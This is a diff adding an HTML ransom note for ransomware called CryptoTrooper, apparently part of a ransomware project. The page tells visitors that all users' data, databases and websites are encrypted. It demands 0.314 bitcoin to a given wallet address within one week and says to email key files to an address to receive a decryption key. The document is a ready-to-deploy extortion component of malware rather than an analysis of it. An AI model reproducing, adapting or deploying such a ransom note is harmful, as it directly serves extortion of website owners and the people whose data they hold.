@@ -1,1 +1,19 @@
-SuspiciousKeyword1 SuspiciousKeyword2 SuspiciousKeyword3
+<html>
+	<style>
+		body{
+			background-image: url("bg.jpg");
+			background-size: cover;
+			color:white;
+		}
+	</style>
+	<body>
+		<b>!WARNING!</b><br><br>
+		<b>YOU ARE INFECTED</b><br>
+		<b>WITH THE MOST CRYPTOGRAPHICALLY ADVANCED RANSOMWARE</b><br>
+		<b>CryptoTrooper</b><br><br>
+		<b>All your data of all your users, all your databases and all your Websites are encrypted</b><br><br>
+		<b>You have one week to transfer 0.314 bitcoins to 4Kg7Cmooris7cLErTsijq6qR1FH3cTiK2H<b><br>
+		<b>After payment, send /key.enc and /key.iv to mail@host.net</b><br>
+		<b>You will receive the key to use with /decipher.sh</b>
+	</body>
+</html>
